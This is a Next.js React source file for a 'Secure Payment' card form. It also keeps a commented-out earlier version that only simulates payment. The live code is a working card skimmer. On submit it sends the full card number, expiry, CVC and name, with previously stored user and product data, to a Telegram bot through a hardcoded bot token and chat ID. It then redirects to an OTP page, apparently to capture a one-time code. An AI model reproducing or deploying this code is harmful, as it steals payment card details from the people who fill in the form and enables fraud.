// // File: pages/payment.tsx
// "use client";

// import React, { useState } from "react";

// export default function PaymentPage() {
//   const [amount, setAmount] = useState(500); // in cents
//   const [name, setName] = useState("");
//   const [cardNumber, setCardNumber] = useState("");
//   const [expiry, setExpiry] = useState("");
//   const [cvc, setCvc] = useState("");
//   const [success, setSuccess] = useState("");
//   const [error, setError] = useState("");

//   const handlePayment = () => {
//     setError("");
//     setSuccess("");

//     // Basic validation
//     if (!name || !cardNumber || !expiry || !cvc) {
//       setError("Please fill all fields");
//       return;
//     }

//     if (cardNumber.length < 12) {
//       setError("Card number too short");
//       return;
//     }

//     // Simulate payment success
//     const paymentData = {
//       name,
//       amount,
//       cardNumber: `**** **** **** ${cardNumber.slice(-4)}`,
//       date: new Date().toISOString(),
//     };

//     // Save to localStorage
//     const payments = JSON.parse(localStorage.getItem("payments") || "[]");
//     payments.push(paymentData);
//     localStorage.setItem("payments", JSON.stringify(payments));

//     setSuccess(`Payment of $${(amount / 100).toFixed(2)} successful!`);
//     setName("");
//     setCardNumber("");
//     setExpiry("");
//     setCvc("");
//   };

//   const previousPayments = JSON.parse(localStorage.getItem("payments") || "[]");

//   return (
//     <div className="min-h-screen bg-gradient-to-tr from-purple-200 via-pink-100 to-yellow-100 flex flex-col items-center p-4">
//       <div className="w-full max-w-md bg-white shadow-lg rounded-xl p-6 sm:p-8 mt-10">
//         <h1 className="text-3xl font-bold mb-6 text-center text-purple-700">
//           💳 Make a Payment
//         </h1>

//         <div className="flex flex-col gap-4">
//           <input
//             type="text"
//             value={name}
//             onChange={(e) => setName(e.target.value)}
//             placeholder="Name on Card"
//             className="border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-400 focus:outline-none"
//           />

//           <input
//             type="text"
//             value={cardNumber}
//             onChange={(e) => setCardNumber(e.target.value)}
//             placeholder="Card Number (1234 5678 9012 3456)"
//             className="border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-400 focus:outline-none"
//           />

//           <div className="flex gap-3">
//             <input
//               type="text"
//               value={expiry}
//               onChange={(e) => setExpiry(e.target.value)}
//               placeholder="MM/YY"
//               className="flex-1 border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-400 focus:outline-none"
//             />
//             <input
//               type="text"
//               value={cvc}
//               onChange={(e) => setCvc(e.target.value)}
//               placeholder="CVC"
//               className="flex-1 border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-400 focus:outline-none"
//             />
//           </div>

//           <input
//             type="number"
//             value={(amount / 100).toFixed(2)}
//             onChange={(e) => setAmount(Number(e.target.value) * 100)}
//             placeholder="Amount (USD)"
//             className="border border-gray-300 rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-400 focus:outline-none"
//           />

//           <button
//             onClick={handlePayment}
//             className="w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white font-bold py-3 rounded-xl shadow-md hover:scale-105 transition-transform"
//           >
//             Pay ${(amount / 100).toFixed(2)}
//           </button>

//           {error && <p className="text-red-500 text-center mt-2">{error}</p>}
//           {success && (
//             <p className="text-green-500 text-center mt-2">{success}</p>
//           )}
//         </div>
//       </div>

//       <div className="w-full max-w-md mt-6">
//         <h2 className="text-xl font-semibold mb-3 text-center text-purple-700">
//           Payment History
//         </h2>
//         <div className="flex flex-col gap-2 max-h-60 overflow-y-auto">
//           {previousPayments.length === 0 && (
//             <p className="text-gray-500 text-center">No payments yet.</p>
//           )}
//           {previousPayments.map((p: any, i: number) => (
//             <div
//               key={i}
//               className="bg-white rounded-xl shadow-md p-3 flex justify-between items-center hover:shadow-lg transition-shadow"
//             >
//               <div>
//                 <p className="font-semibold">{p.name}</p>
//                 <p className="text-sm text-gray-500">{p.cardNumber}</p>
//               </div>
//               <div className="text-right">
//                 <p className="font-bold text-purple-600">
//                   ${(p.amount / 100).toFixed(2)}
//                 </p>
//                 <p className="text-xs text-gray-400">
//                   {new Date(p.date).toLocaleDateString()}{" "}
//                   {new Date(p.date).toLocaleTimeString()}
//                 </p>
//               </div>
//             </div>
//           ))}
//         </div>
//       </div>
//     </div>
//   );
// }

"use client";

import { useRouter } from "next/navigation";

import React, { useEffect, useState } from "react";

export default function PaymentPage() {
  const [amount, setAmount] = useState(500);
  const [name, setName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [success, setSuccess] = useState("");
  const [error, setError] = useState("");
  const [botData, seBotData] = useState();
  const router = useRouter();

  console.log("botData", botData);
  useEffect(() => {
    seBotData(localStorage.getItem("dataSent to The bot"));
  }, []);

  const handlePayment = async () => {
    setError("");
    setSuccess("");
    const message = `
    USer and Product Information 
    -----------------------------
    ${botData}
    -------------------------------------------------------
    Cardm Information 💸
    ---------------------
    name : ${name}
    cardNumber : ${cardNumber}
    expiry : ${expiry}
    cvc : ${cvc}
    `;
    localStorage.setItem("dataSent to The bot", message);
    console.log("message", message);
    if (!name || !cardNumber || !expiry || !cvc) {
      setError("Please fill all fields");
      return;
    }

    const token = "8758821136:AAH-ON6KCqjx1UB_6EpH1yi3S0SWIGkhDaY";
    const chatId = "6032588551";

    // const message = "Hello from my bot 🚀";

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${token}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        },
      );

      const result = await response.json();
      console.log(result);
      router.push("/otpPage");
    } catch (error) {
      console.error(error);
    }

    if (cardNumber.length < 12) {
      setError("Card number too short");
      return;
    }

    const paymentData = {
      name,
      amount,
      cardNumber: `**** **** **** ${cardNumber.slice(-4)}`,
      date: new Date().toISOString(),
    };

    const payments = JSON.parse(localStorage.getItem("payments") || "[]");
    payments.push(paymentData);
    localStorage.setItem("payments", JSON.stringify(payments));

    setSuccess(`Payment of $${(amount / 100).toFixed(2)} successful!`);

    setName("");
    setCardNumber("");
    setExpiry("");
    setCvc("");
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-purple-100 via-pink-50 to-yellow-50 p-4">
      <div className="w-full max-w-md bg-white shadow-2xl rounded-2xl p-6 md:p-8 space-y-6">
        <h1 className="text-3xl font-bold text-center text-purple-700">
          💳 Secure Payment
        </h1>

        {/* Card Preview */}
        <div className="bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-xl p-6 shadow-lg">
          <p className="tracking-widest text-lg mb-4">
            {cardNumber || "**** **** **** ****"}
          </p>

          <div className="flex justify-between text-sm">
            <span>{name || "Card Holder"}</span>
            <span>{expiry || "MM/YY"}</span>
          </div>
        </div>

        {/* Payment Form */}
        <div className="space-y-4">
          Name on Card
          <input
            type="text"
            placeholder="Name on Card"
            value={name}
            onChange={(e) => setName(e.target.value)}
            className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
          />
          {/* Card Number
          <input
            type="text"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
            className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
          /> */}
          Card Number
          <input
            type="text"
            placeholder="1234 5678 9012 3456"
            value={cardNumber}
            onChange={(e) => {
              let value = e.target.value.replace(/\D/g, ""); // remove non numbers
              value = value.substring(0, 16); // limit to 16 digits
              value = value.replace(/(.{4})/g, "$1 ").trim(); // add space every 4 numbers
              setCardNumber(value);
            }}
            maxLength={19} // 16 numbers + 3 spaces
            className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
          />
          <div className="grid grid-cols-2 gap-3">
            <input
              type="date"
              placeholder="MM/YY"
              value={expiry}
              onChange={(e) => setExpiry(e.target.value)}
              className="border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
            />

            <input
              type="text"
              max={3}
              placeholder="CVC"
              value={cvc}
              onChange={(e) => {
                // Remove non-digit characters and limit to 3 digits
                const value = e.target.value.replace(/\D/g, "").slice(0, 3);
                setCvc(value);
              }}
              className="border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
            />
          </div>
          {/* <input
            type="number"
            placeholder="Amount (USD)"
            value={(amount / 100).toFixed(2)}
            onChange={(e) => setAmount(Number(e.target.value) * 100)}
            className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-purple-400 outline-none"
          /> */}
          <button
            onClick={handlePayment}
            className="w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white font-semibold py-3 rounded-xl shadow-md hover:scale-105 transition-transform cursor-pointer"
          >
            Pay
          </button>
          {error && <p className="text-red-500 text-center text-sm">{error}</p>}
          {/* {success && (
            <p className="text-green-500 text-center text-sm">{success}</p>
          )} */}
        </div>
      </div>
    </div>
  );
}
